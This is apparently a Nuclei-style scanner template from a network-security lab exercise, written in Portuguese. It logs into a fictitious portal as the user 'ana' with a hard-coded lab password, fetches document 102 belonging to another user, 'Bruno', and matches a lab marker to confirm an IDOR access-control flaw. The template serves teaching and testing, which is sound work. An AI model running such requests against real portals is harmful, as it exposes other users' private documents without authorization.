id: lab-portal-idor
info:
  name: Portal ficticio - Ana acessa documento de Bruno
  author: atividade-seguranca-redes
  severity: high
  description: Autentica como Ana e verifica o marcador exclusivo do documento de Bruno.
  tags: portal,idor,access-control
http:
  - raw:
      - |
        POST /api/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"login":"ana","senha":"CampusLab!2026"}
      - |
        GET /api/documentos/102 HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: dsl
        dsl:
          - 'status_code_1 == 200 && contains(body_1, "\"login\":\"ana\"") && status_code_2 == 200 && contains(body_2, "LAB_DOCUMENTO_BRUNO")'
